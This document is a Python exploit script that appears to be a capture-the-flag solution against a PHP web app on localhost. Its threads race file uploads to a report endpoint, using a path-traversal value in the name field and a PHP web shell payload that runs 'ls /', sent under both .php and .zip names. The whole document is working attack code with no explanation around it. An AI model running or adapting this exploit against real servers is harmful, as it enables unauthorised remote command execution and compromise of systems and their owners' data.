import requests 
from threading import Thread
url = "http://localhost:8090"

def go1(): 
    for _ in range(1000): 
        s = requests.session() 
        r = s.post(
            f"{url}/api/report_check.php",
            # cookies={"PHPSESSID": "4b8797394b99867a82cc8f2868626dd7"},
            cookies={"PHPSESSID":"4b8797394b99867a82cc8f2868626dd7"}, # remote
            data={ 
                'name': "../../var/www/html/",
                "content": "asdf"
            }, 
            files={
                "evidence": ('.php', "<?php system('ls /'); ?>", 'application/zip')
            },
            allow_redirects=False
        )
        print(r.status_code) 
        if "신고가 완료" in r.text:
            print(r.text)   

def go2(): 
    for _ in range(1000): 
        s = requests.session() 
        r = s.post(
            f"{url}/api/report_check.php",
            # cookies={"PHPSESSID": "4b8797394b99867a82cc8f2868626dd7"},
            cookies={"PHPSESSID":"4b8797394b99867a82cc8f2868626dd7"}, # remote
            data={ 
                'name': "../../var/www/html/",
                "content": "asdf"
            }, 
            files={
                "evidence": ('.zip', "<?php system('ls /'); ?>", 'application/zip')
            },
            allow_redirects=False
        )

threads = [] 
for _ in range(4): 
    thr = Thread(target=go1)
    threads.append(thr) 
    thr.start()

for _ in range(4): 
    thr = Thread(target=go2)
    threads.append(thr) 
    thr.start()

for thr in threads: 
    thr.join() 